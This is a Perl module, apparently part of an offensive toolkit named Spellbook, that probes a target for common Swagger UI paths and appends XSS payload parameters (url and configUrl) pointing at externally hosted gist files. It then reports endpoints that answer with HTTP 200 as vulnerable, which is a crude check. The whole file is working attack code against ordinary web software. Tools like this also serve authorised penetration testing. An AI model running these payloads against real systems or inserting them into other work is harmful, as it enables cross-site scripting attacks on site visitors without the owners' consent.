package Spellbook::Exploit::Swagger_XSS {

    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @vulnerable_endpoints);

        Getopt::Long::GetOptionsFromArray(
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($help) {
            return <<"EOT";
Exploit::Swagger_XSS
=====================
-h, --help     See this menu
-t, --target   Set a target

EOT
        }

        return 0 unless $target;

        $target = "https://$target" unless $target =~ /^http(?:s)?:\/\//x;
        $target =~ s/\/$//x;

        my $useragent = Spellbook::Core::UserAgent->new();

        my @paths = (
            "/swagger", "/swagger-ui", "/swagger.json", "/v2/api-docs", "/api-docs",
            "/api/swagger", "/api/swagger-ui", "/api/swagger.json", "/api/v2/api-docs",
            "/api/api-docs", "/docs/swagger", "/docs/swagger-ui", "/docs/swagger.json",
            "/docs/v2/api-docs", "/docs/api-docs", "/swagger-ui.html", "/api/swagger-ui.html",
            "/api/v1/swagger-ui.html", "/v1/swagger-ui.html", "/api/v2/swagger-ui.html",
            "/v2/swagger-ui.html", "/api/v3/swagger-ui.html", "/v3/swagger-ui.html"
        );

        my @payloads = (
            "?url=https://gist.githubusercontent.com/htrgouvea/df8a1a495c96c9942adc003884bc6b30/raw/92202a78d99d6c284b675ed34cf882895d75dfb4/payload-swagger-ui.yml",
            "?configUrl=https://gist.githubusercontent.com/htrgouvea/86e17124610e7550295533e9d7bac571/raw/cf690c6862d38e02a081a9d580510ba8fff28bef/payload-swagger-ui.json"
        );

        foreach my $path (@paths) {
            my $base_url = "$target$path";
            my $initial_response = $useragent->get($base_url);

            next unless $initial_response->code() == 200;
            next unless $initial_response->content() =~ /<title>(.*)<\/title>/x;
            next unless $1 =~ /Swagger UI/;

            foreach my $payload (@payloads) {
                my $test_url = $base_url . $payload;
                my $test_response = $useragent->get($test_url);

                push @vulnerable_endpoints, $test_url if $test_response->code() == 200;
            }
        }

        return @vulnerable_endpoints;
    }
}

1;